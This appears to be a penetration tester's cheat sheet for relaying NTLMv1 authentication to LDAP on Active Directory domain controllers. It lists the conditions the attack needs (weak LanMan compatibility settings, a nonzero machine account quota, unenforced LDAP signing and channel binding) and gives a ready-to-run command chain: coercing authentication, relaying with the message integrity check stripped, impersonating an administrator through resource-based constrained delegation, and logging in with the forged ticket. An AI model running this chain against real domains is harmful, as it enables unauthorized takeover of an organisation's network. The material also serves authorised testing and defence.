# NTLMv1

## Relaying NTLMv1

### LDAP

### Requirements

- At least two Domain Controllers in the target Domain
- One domain controller configured with a LanMan Compatability setting at or less than '2' (Coerce Target)
- The other Domain Controller with a LanMan Compatability setting at or less than '4' (Relay Target)(Requires verification. Lab results suggest a value of '5' still works for NTLM through LDAP?)

#### Optional Requirements (Depends on attack vector)

#### MAQ -> RBCD -> Domain Administrator

- MAQ Greater than 0
- LDAP Channel Binding and Signing both not enforced
- Account to impersonate not in "Protected Users" or "Sensitive and cant be delegated"

#### Attack Chain

> Coerce
```bash
coercer coerce -u "USERNAME" -p "PASSWORD" -d "DOMAIN" -t "TARGET" -l "LISTENER"
```
> Relay
```
sudo impacket-ntlmrelayx -t ldap://TARGET --remove-mic -smb2support --delegate-access
```
> RBCD
```bash
impacket-getST DOMAIN/'MACHINE$':'PASSWORD' -impersonate "ADMIN" -spn "SERVICE/TARGET FQDN" -dc-ip "DC IP"
```
> Authentication
```bash
nxc smb "TARGET" --use-kcache 
```